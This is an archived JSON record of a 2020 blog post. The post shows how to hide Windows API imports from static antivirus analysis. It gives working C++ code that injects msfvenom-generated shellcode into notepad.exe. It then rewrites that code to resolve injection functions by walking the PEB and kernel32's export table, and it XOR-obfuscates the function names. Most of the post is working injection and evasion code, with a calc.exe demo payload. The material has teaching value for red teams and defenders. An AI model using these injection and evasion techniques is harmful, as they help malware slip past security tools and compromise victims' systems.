{
    "id": "d71c852e-fe6e-40ca-b9f7-41c39799d902",
    "created_at": "2023-01-12T15:02:54.891687Z",
    "updated_at": "2025-03-27T02:05:44.542135Z",
    "deleted_at": null,
    "sha1_hash": "1c66941cfc03cb5b7c6406225573060eba3a1934",
    "title": "2020-02-18 - Hidden in PEB Sight- Hiding Windows API Imports With a Custom Loader",
    "authors": "",
    "file_creation_date": "2022-05-28T21:42:39Z",
    "file_modification_date": "2022-05-28T21:42:39Z",
    "file_size": 151283,
    "plain_text": "# Hidden in PEB Sight: Hiding Windows API Imports With a Custom Loader\n\n**[blog.christophetd.fr/hiding-windows-api-imports-with-a-customer-loader/](https://blog.christophetd.fr/hiding-windows-api-imports-with-a-customer-loader/)**\n\nchristophetd 18 February 2020\n\n### In this post, we look at different techniques to hide Windows API imports in a program in order to fly under the radar of static analysis tools. Especially, we show a method to hide those imports by dynamically walking the process environment block (PEB) and parsing kernel32.dll in-memory to find its exported functions. Let‚Äôs dive in!\n\n## Basic shellcode injection\n\n### Say we want to write a small program injecting a shellcode into the first instance it finds of notepad.exe. In the most basic case, the layout of the code looks like this:\n\n Find the PID of notepad.exe Get a handle to it using OpenProcess Allocate a writable and executable page in the target process memory Write our shellcode to it Call CreateRemoteThread and give it the address where the shellcode is located in memory\n\n This will cause a new thread to spawn in notepad.exe and to execute our shellcode. Here is the sample code:\n\n\n-----\n\n```\n// msfvenom p windows/x64/exec CMD calc.exe EXITFUNC thread f c a x64\nunsigned char shellcode[] =\n     \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"\n     \"\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n     \"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\"\n     \"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\"\n     \"\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\"\n     \"\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\"\n     \"\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\"\n     \"\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\"\n     \"\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\"\n     \"\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\"\n     \"\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\"\n     \"\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\"\n     \"\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\"\n     \"\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n     \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\"\n     \"\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\"\n     \"\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\"\n     \"\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\"\n     \"\\x63\\x2e\\x65\\x78\\x65\\x00\";\nint main(int argc, char* argv[])\n{\n     // Get a handle on the target process. The target needs to be a 64 bit\nprocess\n     HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, true,\nfind_process(L\"notepad.exe\"));\n     // Allocate a RWX page in the target process memory\n     LPVOID targetPage = VirtualAllocEx(hTargetProcess, NULL, sizeof(shellcode),\nMEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n     WriteProcessMemory(hTargetProcess, targetPage, shellcode, sizeof(shellcode),\nNULL);\n     // Create a thread in the target process pointing to the shellcode\n     DWORD ignored;\n     CreateRemoteThread(hTargetProcess, NULL, 0,\n(LPTHREAD_START_ROUTINE)targetPage, NULL, 0, &ignored);\n     return EXIT_SUCCESS;\n}\n\n### The function find_process is not relevant but included here for completeness:\n\n```\n\n-----\n\n```\n#include <iostream>\n#include <windows.h>\n#include <tlhelp32.h>\nint find_process(const wchar_t* process_name) {\n  PROCESSENTRY32 entry;\n  entry.dwSize = sizeof(PROCESSENTRY32);\n  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n  int returnValue = 0;\n  if (!Process32First(snapshot, &entry)) {\n    goto cleanup;\n  }\n  do {\n    if (wcscmp(entry.szExeFile, process_name) == 0) {\n      returnValue = entry.th32ProcessID;\n      goto cleanup;\n    }\n  } while (Process32Next(snapshot, &entry));\ncleanup:\n  CloseHandle(snapshot);\n  return returnValue;\n}\n\n### This works as intended ‚Äì but if we take a look at the generated executable file, we can very clearly see the functions from the Windows API we use:\n\n CreateToolhelp32Snapshot, Process32First and Process32Next to find our target process. OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread for code injection.\n\n These are highly suspicious and represent the typical behavior of a program attempting to enumerate running processes in order to inject code in one of them. The easiest way to see these imports is to open the file in VirusTotal or PeStudio.\n\n```\n\n-----\n\n### Imports from kernel32.dll as shown by\n\n VirusTotal\n\n Imports as shown by PeStudio. The functions we use are on a blacklist and even already mapped to MITRE ATT&CK! In this situation, we‚Äôre 100% sure to get caught even by the weakest antivirus perforrming static analysis. Can we do any better?\n\n## Resolving imports with GetProcAddress\n\n### The Windows API exposes a method allowing us to dynamically retrieve the address of a function: GetProcAddress, whose prototype is:\n```\nFARPROC GetProcAddress(\n HMODULE hModule,\n LPCSTR lpProcName\n);\n\n The first parameter can be retrieved via a call to GetModuleHandleA. Let‚Äôs see what things look like if we rewrite our previous injection code to dynamically resolve function names using a call to GetProcAddress. For every function call we wish to hide, we need to:\n\n Define a type representing a function pointer\n\n```\n\n-----\n\n### Call GetProcAddress\n\n Example for OpenProcess:\n```\n// Get a handle on kernel32.dll\nHMODULE kernel32 = GetModuleHandleA(\"kernel32.dll\");\n// Define the prototype of 'OpenProcess' \n// (see https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nfprocessthreadsapi-openprocess)\nusing OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);\n// Perform the dynamic resolving using GetProcAddress\nOpenProcessPrototype OpenProcess = (OpenProcessPrototype)GetProcAddress(kernel32,\n\"OpenProcess\");\n// Now we can call 'OpenProcess' just like before!\nHANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, true,\nfind_process(L\"notepad.exe\"));\n\n It makes the code a bit heavier, but whatever. Here‚Äôs the full program using this technique:\n\n```\n\n-----\n\n```\n#include <iostream>\n#include <windows.h>\n#include <tlhelp32.h>\nusing namespace std;\n// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c -a x64\nunsigned char shellcode[] =\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"\n\"\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n\"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\"\n\"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\"\n\"\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\"\n\"\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\"\n\"\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\"\n\"\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\"\n\"\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\"\n\"\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\"\n\"\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\"\n\"\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\"\n\"\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\"\n\"\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\"\n\"\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\"\n\"\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\"\n              \"\\x63\\x2e\\x65\\x78\\x65\\x00\";\nHMODULE kernel32 = GetModuleHandleA(\"kernel32.dll\");\n// Finds the first occurrency of a process named\nint find_process(const wchar_t* process_name)\n{\n  /* Dynamic imports */\n  using CreateToolhelp32SnapshotPrototype = HANDLE(WINAPI*)(DWORD, DWORD);\n  CreateToolhelp32SnapshotPrototype CreateToolhelp32Snapshot =\n(CreateToolhelp32SnapshotPrototype)GetProcAddress(kernel32,\n\"CreateToolhelp32Snapshot\");\n\n```\n\n-----\n\n```\n  using Process32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);\n  Process32FirstPrototype Process32First =\n(Process32FirstPrototype)GetProcAddress(kernel32, \"Process32FirstW\");\n  using Process32NextPrototype = Process32FirstPrototype;\n  Process32NextPrototype Process32Next =\n(Process32NextPrototype)GetProcAddress(kernel32, \"Process32NextW\");\n  /* Rest of the code, no changes */\n  PROCESSENTRY32 entry;\n  entry.dwSize = sizeof(PROCESSENTRY32);\n  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n  int returnValue = 0;\n  if (!Process32First(snapshot, &entry)) {\n    goto cleanup;\n  }\n  do {\n    if (wcscmp(entry.szExeFile, process_name) == 0) {\n      returnValue = entry.th32ProcessID;\n      goto cleanup;\n    }\n  } while (Process32Next(snapshot, &entry));\ncleanup:\n  CloseHandle(snapshot);\n  return returnValue;\n}\nint main(int argc, char* argv[])\n{\n  /* Dynamic imports */\n  using OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);\n  OpenProcessPrototype OpenProcess = (OpenProcessPrototype)GetProcAddress(kernel32,\n\"OpenProcess\");\n  using VirtualAllocExPrototype = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD,\nDWORD);\n  VirtualAllocExPrototype VirtualAllocEx =\n(VirtualAllocExPrototype)GetProcAddress(kernel32, \"VirtualAllocEx\");\n  using WriteProcessMemoryPrototype = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID,\nSIZE_T, SIZE_T*);\n  WriteProcessMemoryPrototype WriteProcessMemory =\n(WriteProcessMemoryPrototype)GetProcAddress(kernel32, \"WriteProcessMemory\");\n  using CreateRemoteThreadPrototype = HANDLE(WINAPI*)(HANDLE,\nLPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);\n  CreateRemoteThreadPrototype CreateRemoteThread =\n(CreateRemoteThreadPrototype)GetProcAddress(kernel32, \"CreateRemoteThread\");\n  /* Rest of the code, no changes */\n\n```\n\n-----\n\n```\n  HANDLE hTargetProcess OpenProcess(PROCESS_ALL_ACCESS, true,\nfind_process(L\"notepad.exe\"));\n  LPVOID targetPage = VirtualAllocEx(hTargetProcess, NULL, sizeof(shellcode),\nMEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n  WriteProcessMemory(hTargetProcess, targetPage, shellcode, sizeof(shellcode),\nNULL);\n  DWORD ignored;\n  CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)targetPage,\nNULL, 0, &ignored);\n  return EXIT_SUCCESS;\n}\n\n### We‚Äôre a little better on the imports side because now we are only importing GetProcAddress and GetModuleHandleW. The detection rate is slightly better (10/69 instead of 13/69 for our first sample), but importing those two functions is still pretty suspicious. Plus, simply checking the strings of our binary still gives us away‚Ä¶\n$ strings sample2.exe | grep -E '(CreateRemote|Write|Virtual)'            \nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\n\n## Use the PEB, Luke\n\n### We need to go a level deeper and‚Ä¶ dynamically resolve the address of GetProcAddress and GetModuleHandleW. How do we do that? Meet the PEB!\n\n The PEB (Process Environment Block) is an in-memory data structure containing a bunch of information about the current running process, including the DLL its has loaded as well as their location in memory. The plan is as follows:\n\n Read the PEB. This is relatively easy because the CPU register FS:[0x18] has a pointer to it. We can also use the undocumented constant NT_TIB from the Windows API.\n Use the PEB to find the base address of kernel32.dll in memory. This gets a bit hairy because we need to iterate through data structures internal to the Windows loader such as PEB_LDR_DATA and LDR_DATA_TABLE_ENTRY.\n\n```\n\n-----\n\n```\n#include <iostream>\n#include <windows.h>\n#include \"Processthreadsapi.h\"\n#include \"Libloaderapi.h\"\n#include <winnt.h>\n#include <winternl.h>\n#include <Lmcons.h>\n#include \"Processthreadsapi.h\"\n#include \"Libloaderapi.h\"\n#include <tlhelp32.h>\n#define ADDR unsigned __int64\n// Utility function to convert an UNICODE_STRING to a char*. Defined at the end of\nthe file\nHRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA);\n// Dynamically finds the base address of a DLL in memory\nADDR find_dll_base(const char* dll_name)\n{\n  // https://stackoverflow.com/questions/37288289/how-to-get-the-processenvironment-block-peb-address-using-assembler-x64-os - x64 version\n  // Note: the PEB can also be found using NtQueryInformationProcess, but this\ntechnique requires a call to GetProcAddress\n  // and GetModuleHandle which defeats the very purpose of this PoC\n  PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>\n(&static_cast<NT_TIB*>(nullptr)->Self)));\n  PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;\n  PLIST_ENTRY head = &loader->InMemoryOrderModuleList;\n  PLIST_ENTRY curr = head->Flink;\n  // Iterate through every loaded DLL in the current process\n  do {\n    PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr,\nLDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n    char* dllName;\n    // Convert unicode buffer into char buffer for the time of the comparison,\nthen free it\n    UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);\n    char* result = strstr(dllName, dll_name);\n    CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi\n    if (result != NULL) {\n      // Found the DLL entry in the PEB, return its base address\n      return (ADDR)dllEntry->DllBase;\n    }\n    curr = curr->Flink;\n  } while (curr != head);\n  return NULL;\n}\n// Utility function to convert an UNICODE_STRING to a char*\nHRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA)\n\n```\n\n-----\n\n```\n{\n  ULONG cbAnsi, cCharacters;\n  DWORD dwError;\n  // If input is null then just return the same.\n  if (pszW == NULL) {\n    *ppszA = NULL;\n    return NOERROR;\n  }\n  cCharacters = wcslen(pszW) + 1;\n  cbAnsi = cCharacters * 2;\n  *ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);\n  if (NULL == *ppszA)\n    return E_OUTOFMEMORY;\n  if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL,\nNULL)) {\n    dwError = GetLastError();\n    CoTaskMemFree(*ppszA);\n    *ppszA = NULL;\n    return HRESULT_FROM_WIN32(dwError);\n  }\n  return NOERROR;\n}\n\n### Once we know where kernel32.dll is in memory, interpret it as a PE file (because, like all DLLs and EXEs, it is a PE file), and walk through its export table to find the function names we want to resolve. Essentially, we need to:\n Find the export table Find the index of the exported function we want to resolve Use this index to index the ordinals table Use this result to index the functions table, giving us a pointer to the exported function\n\n```\n\n-----\n\n```\n#include <iostream>\n#include <windows.h>\n#include \"Processthreadsapi.h\"\n#include \"Libloaderapi.h\"\n#include <winnt.h>\n#include <winternl.h>\n#include <Lmcons.h>\n#include \"Processthreadsapi.h\"\n#include \"Libloaderapi.h\"\n#include <tlhelp32.h>\n// Given the base address of a DLL in memory, returns the address of an exported\nfunction\nADDR find_dll_export(ADDR dll_base, const char* export_name)\n{\n  // Read the DLL PE header and NT header\n  PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;\n  PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader>e_lfanew);\n  // The RVA of the export table if indicated in the PE optional header\n  // Read it, and read the export table by adding the RVA to the DLL base address\nin memory\n  DWORD exportDescriptorOffset = peNtHeaders>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n  PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base +\nexportDescriptorOffset);\n  // Browse every export of the DLL. For the i-th export:\n  // - The i-th element of the name table contains the export name\n  // - The i-th element of the ordinal table contains the index with which the\nfunctions table must be indexed to get the final function address\n  DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);\n  WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);\n  DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);\n  for (int i = 0; i < exportTable->NumberOfNames; ++i) {\n    char* funcName = (char*)(dll_base + name_table[i]);\n    ADDR func_ptr = dll_base + func_table[ordinal_table[i]];\n    if (!_strcmpi(funcName, export_name)) {\n      return func_ptr;\n    }\n  }\n  return NULL;\n}\n\n### Not critically hard, but a bit hairy as well. I‚Äôm not going to lie, it took me a few evenings to get it right‚Ä¶ üôÇ\n\n We can now use these as a building block to dynamically find any function!\n\n```\n\n-----\n\n```\nADDR kernel32_base find_dll_base( KERNEL32.DLL );\nprintf(\"kernel32.dll @ %p\\n\", kernel32_base);\nADDR openProcessAddress = find_dll_export(kernel32_base, \"OpenProcess\");\nprintf(\"OpenProcess @ %p\\n\", openProcessAddress);\n\n### Result:\nkernel32.dll @ 00007FFF023B0000\nOpenProcess @ 00007FFF023CA1A0\n\n We can therefore use this to dynamically find GetProcAddress and GetModuleHandleW, in order to use them to dynamically find other functions.\nusing GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);\nusing GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);\nADDR kernel32_base = find_dll_base(\"KERNEL32.DLL\");\nGetProcAddressPrototype MyGetProcAddress = (GetProcAddressPrototype)\nfind_dll_export(kernel32_base, \"GetProcAddress\");\nGetModuleHandlePrototype MyGetModuleHandle = (GetModuleHandlePrototype)\nfind_dll_export(kernel32_base, \"GetModuleHandleA\");\n\n Here‚Äôs the full code using this technique: https://gist.github.com/christophetd/37141ba273b447ff885c323c0a7aff93\n\n If we load the executable we obtain in a static analysis tool, we now don‚Äôt have any more visible suspicious GetProcAddress import!\n\n But we didn‚Äôt get any better hiding our strings:\n$ strings sample3.exe | grep -E '(CreateRemote|Write|Virtual)'\nVirtualAllocEx\nWriteProcessMemory\nVirtualProtectEx\nCreateRemoteThread\n\n What used to be a string introduced by a function call OpenProcess(xx) is now a string introduced in the binary by a string literal when we perform the dynamic import. Can we do any better?\n\n## No strings attached\n\n### In order to hide our suspicious strings, we can proceed as follows:\n\n Use the same method as we used to resolve GetProcAddress to also resolve other functions\n Obfuscate somehow our strings (such as ‚ÄúOpenProcess‚Äù), for instance by XOR‚Äôing them prior to the compilation and XOR‚Äôing them again when performing the comparison against the exported function names of kernel32.dll.\n\n```\n\n-----\n\n### A more complete description of this method, written by LloydLabs, is available here. In our case, the piece of code to change would be:\n```\n// Before\nif (!_strcmpi(funcName, export_name)) {\n// After\nif (!_strcmpi(funcName, DECRYPT(export_name))) {\n\n And what‚Äôs in the resolve_imports method:\n// Before\ndynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base,\n\"GetProcAddress\");\n// After\nchar str[] = {0x5,0x27,0x36,0x12,0x30,0x2d,0x21,0x3,0x26,0x26,0x30,0x27,0x31,0x31}\ndynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base,\nDECRYPT(str));\n\n ‚Ä¶ assuming DECRYPT is a function or macro XOR‚Äôing each byte with 0x42.\n\n I won‚Äôt provide the full code for this, mainly because it‚Äôs 1:40am at the time of writing. Let‚Äôs say it‚Äôs left as an exercise to the reader!\n\n## Wrapping up\n\n### What have we achieved? We managed to import and use Windows API functions in a way that is not detectable by static analysis tools. Along the way, we learned about the PEB and about the structure of a PE file. And hopefully, we had some fun ‚Äì at least, I did. üôÇ\n\n Quick notes:\n\n Everything we did would still be caught by dynamic analysis. The code snippets work only for 64-bit processes. PM me if you‚Äôd like me to provide you with a 32-bit version.\n\n I hope you liked this post! Comments below or tweets to @christophetd are always welcome.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-18 - Hidden in PEB Sight- Hiding Windows API Imports With a Custom Loader.pdf"
    ],
    "report_names": [
        "2020-02-18 - Hidden in PEB Sight- Hiding Windows API Imports With a Custom Loader.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535774,
    "ts_updated_at": 1743041144,
    "ts_creation_date": 1653774159,
    "ts_modification_date": 1653774159,
    "files": {
        "pdf": "https://archive.orkl.eu/1c66941cfc03cb5b7c6406225573060eba3a1934.pdf",
        "text": "https://archive.orkl.eu/1c66941cfc03cb5b7c6406225573060eba3a1934.txt",
        "img": "https://archive.orkl.eu/1c66941cfc03cb5b7c6406225573060eba3a1934.jpg"
    }
}